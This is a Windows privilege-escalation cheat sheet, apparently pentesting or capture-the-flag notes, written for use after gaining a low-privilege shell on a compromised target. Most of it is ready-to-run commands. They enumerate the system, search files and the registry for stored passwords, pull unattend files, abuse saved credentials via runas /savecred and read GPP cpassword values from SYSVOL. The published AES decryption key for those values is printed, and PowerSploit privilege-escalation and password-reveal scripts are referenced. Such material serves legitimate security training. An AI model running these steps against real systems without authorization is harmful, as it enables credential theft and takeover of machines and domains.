# Windows Privilege Escalation 
This cheat sheet contains the flow chart methodology that can be used to test Windows privilege escalation.
## System Information Gathering
Use the following steps to gather basic system information once we get a low privilege shell on a Micorsoft Windows system.
### All System Info
To get system information, try the following DOS command,
```
C:> systeminfo
```
### User Info
We can get a list of users with the following command,
```
C:> net user
C:> net user (USERNAME)
```
### Network Information
We can use DOS to gather network information from the comrpomised taregt Microsoft Windows machine with the following DOS commands,
```
C:> ipconfig /all
C:> route print
C:> arp -A
C:> netstat -ano
C:> netsh firewall show state
C:> netsh firewall show config
```
### Scheduled Tasks
Micorosft Windows might have scheduled tasks which we can leverge depending on the task, permissions, the files it accesses and their permissions, and how oftne the task runs. Use the followinf DOS command to gather scheduled task information from Microsoft Windows,
```
C:> schtasks /query /fo LIST /v
C:> tasklist /SVC
C:> net start
```
### Drivers
Some drivers might have vulnerabilities. We can list the drivers used on a Microsoft Windows system with the following DOS command,
```
C:> DRIVERQUERY
```
## Missing Patches
To get the patch information for Microsoft Windows systems, we can us `wmic` as shown below.
```
C:> wmic qfe get Caption, Description, HotFixID, InstalledOn
C:> wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
```
Then do a search in Exploit-DB with `searchsploit` in Kali Linux.
## Browser Credentials
Browser credentials could lead to escalation if the credentials are reused on other systems and services. 

## PowerUp
The [PowerUp Power Shell script](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) PowerSploit module can be used to search for injectable DLLs, service permissions, autologin credentials, web configuration credentials and many other areas of the OS and FS that can be used specifically for privilege escalation.

## AlwaysInstallElevated
This option in the Windows registry will aloow us to execute a binary that does `execv()` and adds an admin user no matter what privilege we current are. This will only work if both registry keys contain "AlwaysInstallElevated" with DWORD values of 1.
```
C:\Windows\system32> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
C:\Windows\system32> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```
## RunAs
You can try the `runas` command with the `/savecred` in hopes that an admin credential has been saved for scripting purposes. For instance, spawn a new shell and write the contents of a protected file to one that you can read, like so,
```
C:\> runas /savecred /user:Administrator "cmd.exe /c type C:\Users\Administrator\Desktop\flag.txt > C:\Users\PwnedUser\Desktop\flag.txt"
```
If the credentials are in fact stored, you will get a new file in the pwned user's desktop called "flag.txt"

## WMIC
Windows Management Instrumentation Console can sometimes be leveraged for privilege escalation.

## Mass Install of Windows to Labs
Sometimes the mass-install process of many Microsoft Windows machines in the same environment can leave behind log files with sensitive information in them. We can check a few of these files if they exist on the file system onthe compromised target Windows machine,
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```
## Groups.xml
If we have access to the SYSVOL/groups.xml file, we have access to any passwords encrypted in there. When a new GPP is created, there’s an associated XML file created in SYSVOL with the relevant configuration data and if there is a password provided, it is AES-256 bit encrypted. 

Since authenticated users (any domain user or users in a trusted domain) have read access to SYSVOL, anyone in the domain can search the SYSVOL share for XML files containing “cpassword” which is the value that contains the AES encrypted password.
```
C:> findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```
The AES decryption key, published by Microsoft themselves, is,
```
4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8	
f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
```
There is a PowerSploit Power Shell script that we can use to automate the password reveal [located here.](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)

## Mass Credentials Search
Below are a few searches that we can do in our DOS prompt for searching for credentials that are stored in files.
```
C:> dir /s *pass* == *cred* == *vnc* == *.config*
C:> findstr /si password *.xml *.ini *.txt
C:> reg query HKLM /f password /t REG_SZ /s
C:> reg query HKCU /f password /t REG_SZ /s
```
## Windows Services
Next, we can try Microsoft Windows Services with the following command,
```
C:> sc qc Sploiler
```
If we upload a copy of the `accesschk.exe` binary from [Microsoft SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) we can check alot of permissions for services. For instance,
```
C:> accesschk.exe -ucqv Spooler
```
will list the Spooler service and it's permissions. To list all services, simply use an asterisk,
```
C:> accesschk.exe -ucqv *
```
